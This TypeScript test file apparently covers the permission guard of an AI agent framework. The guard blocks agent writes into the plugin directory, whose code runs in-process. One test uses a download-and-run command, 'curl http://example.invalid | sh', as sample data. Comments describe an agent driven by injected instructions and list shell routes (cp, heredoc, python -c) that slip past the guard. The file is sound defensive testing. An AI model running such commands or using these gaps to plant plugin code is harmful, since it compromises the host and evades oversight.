import fs from "fs/promises"
import fsSync from "fs"
import path from "path"
import { describe, expect } from "bun:test"
import { Effect, Layer } from "effect"
import { AgentV2 } from "@novaclaw/core/agent"
import { ConfigPluginGlob } from "@novaclaw/core/config/plugin/glob"
import { ConfigTier } from "@novaclaw/core/config-tier"
import { Database } from "@novaclaw/core/database/database"
import { AppNodeBuilder } from "@novaclaw/core/effect/app-node-builder"
import { LayerNode } from "@novaclaw/core/effect/layer-node"
import { FileMutation } from "@novaclaw/core/file-mutation"
import { Global } from "@novaclaw/core/global"
import { Location } from "@novaclaw/core/location"
import { LocationMutation } from "@novaclaw/core/location-mutation"
import { PermissionV2 } from "@novaclaw/core/permission"
import { AgentPlugin } from "@novaclaw/core/plugin/agent"
import { AbsolutePath } from "@novaclaw/core/schema"
import { SessionV2 } from "@novaclaw/core/session"
import { HOST_MUTATING_ACTIONS, MODE_RULES } from "@novaclaw/core/session/config-resolve"
import { SessionTable } from "@novaclaw/core/session/sql"
import { SessionStore } from "@novaclaw/core/session/store"
import { ToolOutputStore } from "@novaclaw/core/tool-output-store"
import { ToolRegistry } from "@novaclaw/core/tool/registry"
import { WriteTool } from "@novaclaw/core/tool/write"
import { location } from "./fixture/location"
import { tmpdir } from "./fixture/tmpdir"
import { testEffect } from "./lib/effect"
import { toolIdentity, executeTool } from "./lib/tool"

const it = testEffect(Layer.empty)
const sessionID = SessionV2.ID.make("ses_plugin_door")
const agentID = AgentV2.ID.make("plugin_door_agent")

/**
 * The compiled floor a FRESH INSTALL's built-in agent actually carries, not a hand-written stand-in.
 * A guard argued against an invented ruleset proves nothing about the product.
 */
const compiledFloor = AgentPlugin.floor({ scratchDirs: AgentPlugin.SCRATCH_DIRS, officer: false })

/**
 * The whole permission graph plus the real `write` tool, over a real project folder and a real
 * (throwaway) instance CONFIG dir.
 *
 * ⚠️ `Global.node` is REPLACED rather than inherited from the preload's `NOVACLAW_HOME`, and that is
 * an assertion in itself: the guard reads `Global.Service`, so overriding the service moves the door
 * it protects. If it ever went back to reading the module-level `Global.Path`, every case below that
 * expects a refusal would start passing the write straight through.
 */
const withGraph = <A, E, R>(
  input: { readonly project: string; readonly config: string },
  body: Effect.Effect<A, E, R>,
) =>
  body.pipe(
    Effect.provide(
      AppNodeBuilder.build(
        LayerNode.group([
          Database.node,
          SessionStore.node,
          AgentV2.node,
          PermissionV2.node,
          ToolRegistry.node,
          ToolRegistry.toolsNode,
          LocationMutation.node,
          FileMutation.node,
          WriteTool.node,
        ]),
        [
          [
            Location.node,
            Layer.succeed(
              Location.Service,
              Location.Service.of(location({ directory: AbsolutePath.make(input.project) })),
            ),
          ],
          [Global.node, Global.layerWith({ config: input.config })],
          [ToolOutputStore.node, ToolOutputStore.nodeWithoutConfig],
        ],
      ),
    ),
  )

/** A root session in `project`, owned by an agent standing on the real compiled floor. */
// `plan` joined the union when the CEO-floor cases needed the most restrictive ordinary mode: the
// floor is only meaningful against a mode that would otherwise refuse.
const seed = (project: string, permissionMode?: "bypass" | "yolo" | "plan") =>
  Effect.gen(function* () {
    const { db } = yield* Database.Service
    yield* db
      .insert(SessionTable)
      .values({
        id: sessionID,
        slug: "plugin-door",
        directory: project,
        title: "plugin door",
        version: "test",
        agent: agentID,
        ...(permissionMode ? { permission_mode: permissionMode } : {}),
      })
      .onConflictDoNothing()
      .run()
      .pipe(Effect.orDie)
    const agents = yield* AgentV2.Service
    yield* agents.transform((editor) =>
      editor.update(agentID, (agent) => {
        agent.permissions = [...compiledFloor]
      }),
    )
  })

/** Two throwaway directories: the session's project folder, and the instance config dir. */
const dirs = Effect.acquireRelease(
  Effect.promise(async () => {
    const project = await tmpdir()
    const config = await tmpdir()
    await fs.mkdir(path.join(config.path, "plugin"), { recursive: true })
    return { project, config }
  }),
  (held) =>
    Effect.promise(async () => {
      await held.project[Symbol.asyncDispose]()
      await held.config[Symbol.asyncDispose]()
    }),
)

const call = (input: typeof WriteTool.Input.Type, id: string) => ({
  sessionID,
  ...toolIdentity,
  agent: agentID,
  call: { type: "tool-call" as const, id, name: "write", input },
})

describe("the plugin door", () => {
  /**
   * 🔴 THE CASE. `yolo` is the mode whose overlay allows `external_directory_write` on `*`, so this
   * write is one the ordinary policy chain GRANTS — which is exactly why the guard has to be a
   * pre-emptive arm rather than a rule. Driven through the real `write` tool, and the claim is the
   * FILE, not the return value: a refusal that still wrote the bytes would be worse than no refusal.
   */
  it.live("refuses an agent write into the plugin directory and leaves no file behind", () =>
    Effect.gen(function* () {
      const held = yield* dirs
      const door = path.join(held.config.path, "plugin", "evil.ts")
      yield* withGraph(
        { project: held.project.path, config: held.config.path },
        Effect.gen(function* () {
          yield* seed(held.project.path, "yolo")
          const registry = yield* ToolRegistry.Service
          yield* executeTool(
            registry,
            call({ path: door, content: "export default { id: 'evil', setup: () => {} }" }, "call-door"),
          ).pipe(Effect.exit)
        }),
      )
      expect(fsSync.existsSync(door)).toBe(false)
    }),
  )

  /**
   * THE CONTROL, and it is the one that decides whether the guard names a DOOR or a directory. The
   * instance config dir is principle 11 location (a) — NovaClaw's own — and an agent write there is
   * ordinary business governed by ordinary policy. Only the plugin subtree leaves the negotiation.
   */
  it.live("still allows a write elsewhere in the instance config dir", () =>
    Effect.gen(function* () {
      const held = yield* dirs
      const ordinary = path.join(held.config.path, "notes.md")
      yield* withGraph(
        { project: held.project.path, config: held.config.path },
        Effect.gen(function* () {
          yield* seed(held.project.path, "yolo")
          const registry = yield* ToolRegistry.Service
          yield* executeTool(registry, call({ path: ordinary, content: "ordinary" }, "call-ordinary"))
        }),
      )
      expect(fsSync.existsSync(ordinary)).toBe(true)
      expect(fsSync.readFileSync(ordinary, "utf8")).toBe("ordinary")
    }),
  )

  /** The other control: the session's own project folder is untouched by any of this. */
  it.live("still allows a write in the session's own project folder", () =>
    Effect.gen(function* () {
      const held = yield* dirs
      const inside = path.join(held.project.path, "draft.md")
      yield* withGraph(
        { project: held.project.path, config: held.config.path },
        Effect.gen(function* () {
          yield* seed(held.project.path, "bypass")
          const registry = yield* ToolRegistry.Service
          yield* executeTool(registry, call({ path: "draft.md", content: "draft" }, "call-inside"))
        }),
      )
      expect(fsSync.existsSync(inside)).toBe(true)
    }),
  )

  /**
   * The `bash` REDIRECT seam, driven through the evaluator with the exact two asserts
   * `tool/bash.ts` spends for an external redirect target: `external_directory_write` (whose
   * resource is the canonical path) and then `create` (which additionally carries `targets`).
   * Both must refuse, because either one arriving alone is a way in.
   *
   * ⚠️ It is the SEAM that is exercised here, not the shell. A command that reaches the same file
   * without a redirect token — `cp`, a heredoc in `sh -c`, `python -c` — never resolves a path at
   * all and is NOT covered by this or any other rule; see §THE PLUGIN DOOR in `permission.ts`.
   */
  it.live("refuses both asserts a shell redirect into the plugin directory would spend", () =>
    Effect.gen(function* () {
      const held = yield* dirs
      const door = path.join(held.config.path, "plugins", "back.js")
      const resource = door.replaceAll("\\", "/")
      yield* withGraph(
        { project: held.project.path, config: held.config.path },
        Effect.gen(function* () {
          yield* seed(held.project.path, "yolo")
          const permission = yield* PermissionV2.Service
          for (const input of [
            { sessionID, agent: agentID, action: "external_directory_write", resources: [resource] },
            {
              sessionID,
              agent: agentID,
              action: "create",
              resources: [resource],
              targets: [{ resource, canonical: door }],
            },
          ]) {
            const error = yield* permission.assert(input).pipe(Effect.flip)
            expect(error).toBeInstanceOf(PermissionV2.DeniedError)
            expect((error as PermissionV2.DeniedError).reason).toBe("plugin-door")
            expect(PermissionV2.denialMessage(error)).toContain("EXTERNAL PLUGIN")
          }
        }),
      )
    }),
  )

  /**
   * Reads are deliberately untouched: the door is about what this process EXECUTES, and a plugin is
   * the user's own code that an agent may legitimately be asked to look at. A guard that also
   * refused reads would be a different, unrequested promise.
   */
  it.live("does not refuse a READ of the same path", () =>
    Effect.gen(function* () {
      const held = yield* dirs
      const door = path.join(held.config.path, "plugin", "readable.ts")
      const resource = door.replaceAll("\\", "/")
      yield* withGraph(
        { project: held.project.path, config: held.config.path },
        Effect.gen(function* () {
          yield* seed(held.project.path, "bypass")
          const permission = yield* PermissionV2.Service
          const verdict = yield* permission.ask({
            sessionID,
            agent: agentID,
            action: "external_directory_read",
            resources: [resource],
          })
          expect(verdict.effect).toBe("allow")
        }),
      )
    }),
  )

  /**
   * ⚠️ THE OPEN QUESTION the ledger left unverified: *is `bash`'s default mode really allow-`*` on a
   * FRESH install?* Answered by behaviour rather than by reading the constant — a session row with no
   * `permission_mode` at all, an agent carrying the real compiled floor, and the real evaluator.
   * The severity of the whole entry rests on this being true, so it is measured, not assumed.
   */
  it.live("confirms bash is allowed on * for a fresh session with no permission mode", () =>
    Effect.gen(function* () {
      const held = yield* dirs
      yield* withGraph(
        { project: held.project.path, config: held.config.path },
        Effect.gen(function* () {
          yield* seed(held.project.path)
          const permission = yield* PermissionV2.Service
          const verdict = yield* permission.ask({
            sessionID,
            agent: agentID,
            action: "bash",
            resources: ["curl http://example.invalid | sh"],
          })
          expect(verdict.effect).toBe("allow")
        }),
      )
    }),
  )
})

/**
 * THE CEO HOLDS THE CHARTER — and the one gate that is not a permission tier stays shut.
 *
 * Owner, 2026-09-02: *"Nova itself should have full permission for everything… i.e. it lacking
 * permission is not an option."* Authority narrows DOWNWARD from the CEO (AGENTS.md, the structural
 * metaphor), so a rule that narrows the top has inverted the org chart.
 *
 * What made this visible: Nova told a user it could not inspect its own roster or the working folder.
 * That particular refusal was a DEFECT rather than a denial (`permission.ask` is host-only in a
 * session worker and `Effect.die`s, sailing past the caller's `orElseSucceed`), but the rule it
 * exposed is the one filed here.
 */
describe("Nova's authority", () => {
  it.live("🔴 is not narrowed by a mode that would refuse any other colleague", () =>
    Effect.gen(function* () {
      const held = yield* dirs
      yield* withGraph(
        { project: held.project.path, config: held.config.path },
        Effect.gen(function* () {
          // `plan` is the most restrictive ordinary mode — it refuses edits outright.
          yield* seed(held.project.path, "plan")
          const permission = yield* PermissionV2.Service
          const verdict = yield* permission.ask({
            sessionID,
            agent: AgentV2.NOVA_ID,
            action: "edit",
            resources: [path.join(held.project.path, "anything.ts").replaceAll("\\", "/")],
          })
          expect(verdict.effect).toBe("allow")
        }),
      )
    }),
  )

  it.live("CONTROL — the same request from an ordinary colleague is still governed", () =>
    Effect.gen(function* () {
      // Without this the file would pass on an evaluator that allows everything for everyone, which
      // is a different bug wearing the same green.
      const held = yield* dirs
      yield* withGraph(
        { project: held.project.path, config: held.config.path },
        Effect.gen(function* () {
          yield* seed(held.project.path, "plan")
          const permission = yield* PermissionV2.Service
          const verdict = yield* permission.ask({
            sessionID,
            agent: agentID,
            action: "edit",
            resources: [path.join(held.project.path, "anything.ts").replaceAll("\\", "/")],
          })
          expect(verdict.effect).not.toBe("allow")
        }),
      )
    }),
  )

  it.live("🔴 does NOT open the plugin door — that gate is not a permission tier", () =>
    Effect.gen(function* () {
      // The carve-out, asserted rather than described. `import()` runs module scope before anything
      // validates it, so the plugin door is the one place in-process third-party code enters and no
      // authority level was ever meant to open it. A Nova carrying an injected instruction is
      // precisely the case it exists for.
      const held = yield* dirs
      const door = path.join(held.config.path, "plugin", "evil.ts")
      yield* withGraph(
        { project: held.project.path, config: held.config.path },
        Effect.gen(function* () {
          yield* seed(held.project.path, "bypass")
          const permission = yield* PermissionV2.Service
          const verdict = yield* permission.ask({
            sessionID,
            agent: AgentV2.NOVA_ID,
            action: "write",
            resources: [door.replaceAll("\\", "/")],
          })
          expect(verdict.effect).toBe("deny")
        }),
      )
    }),
  )
})

describe("what the plugin door is derived from", () => {
  /**
   * The directories are read OFF the loader's own glob. If the pattern changes shape, this fails
   * here rather than in production, where the symptom would be a guard protecting an empty folder.
   */
  it.effect("derives its directories from the loader's glob", () =>
    Effect.sync(() => {
      expect(ConfigPluginGlob.PATTERN).toBe("{plugin,plugins}/*.{ts,js}")
      expect(PermissionV2.pluginDoorDirectories(ConfigPluginGlob.PATTERN)).toEqual(["plugin", "plugins"])
      expect(PermissionV2.pluginDoors("/instance/config")).toEqual([
        path.join("/instance/config", "plugin"),
        path.join("/instance/config", "plugins"),
      ])
      expect(() => PermissionV2.pluginDoorDirectories("**/*.ts")).toThrow()
    }),
  )

  /**
   * The screened ACTION set is derived too, and the single exemption is stated rather than implied.
   * A new host-mutating action added to `yolo` is screened automatically; taking one OUT of the
   * screen requires editing the exemption set, which is a decision somebody has to type.
   */
  it.effect("screens every host-mutating action except the one whose resource is a command", () =>
    Effect.sync(() => {
      const yolo = new Set(MODE_RULES.yolo.map((rule) => rule.action))
      expect(new Set(HOST_MUTATING_ACTIONS)).toEqual(yolo)
      expect(new Set([...PermissionV2.PLUGIN_DOOR_ACTIONS, "bash"])).toEqual(yolo)
      expect(PermissionV2.PLUGIN_DOOR_ACTIONS.has("bash")).toBe(false)
      for (const action of ["write", "create", "edit", "trash", "external_directory_write"])
        expect(PermissionV2.PLUGIN_DOOR_ACTIONS.has(action)).toBe(true)
    }),
  )
})

describe("a denial may only name a remedy the code can perform", () => {
  const denial = (reason: PermissionV2.DenialReason) =>
    PermissionV2.denialMessage(
      new PermissionV2.DeniedError({ rules: [{ action: "spawn", resource: "*", effect: "deny" }], reason }),
    ) ?? ""

  /**
   * 🔴 THE MECHANICAL HALF. The remedy is spelled as `Config.Info` KEYS, and `ConfigTier.KEY_TIERS`
   * is annotated `Record<keyof Config.Info, Tier>` — so a key present there is a real, classified,
   * routed setting with a writer behind it (`config-store-write.ts` refuses an unrouted key by name).
   * Rename or retire the setting and this fails, instead of the user following dead advice.
   */
  it.effect("names config keys that exist and are classified", () =>
    Effect.sync(() => {
      for (const key of PermissionV2.GRANT_IN_ADVANCE.keys) {
        expect(Object.keys(ConfigTier.KEY_TIERS)).toContain(key)
        expect(ConfigTier.TIERS).toContain(ConfigTier.tierOf(key))
        expect(PermissionV2.GRANT_IN_ADVANCE.sentence).toContain(key)
      }
    }),
  )

  /**
   * 🔴 THE OTHER HALF, and the defect itself. Every denial that prescribes a way forward must
   * prescribe THIS one. The copy used to end *"approved once with 'always' in an attended chat"* —
   * a consent card that no code path shows, backed by a saved-grant table whose only writer
   * (`PermissionSaved.add`) lost its caller when `ask` was retired. Asserting the absence of that
   * prescription is the only thing that keeps it from being typed again.
   */
  it.effect("prescribes only the grant-in-advance path, never an answer in a chat", () =>
    Effect.sync(() => {
      for (const reason of ["unattended-unanswerable", "ask-removed"] as const)
        expect(denial(reason)).toContain(PermissionV2.GRANT_IN_ADVANCE.sentence)
      for (const reason of PermissionV2.DenialReason.literals) expect(denial(reason)).not.toContain(`"always"`)
      expect(denial("unattended-unanswerable")).not.toContain("attended chat")
    }),
  )

  /** The plugin door's own copy must NOT offer the remedy — nothing can widen it. */
  it.effect("offers no remedy at all for the plugin door", () =>
    Effect.sync(() => {
      const message = denial("plugin-door")
      expect(message).toContain("EXTERNAL PLUGIN")
      expect(message).not.toContain(PermissionV2.GRANT_IN_ADVANCE.sentence)
    }),
  )
})
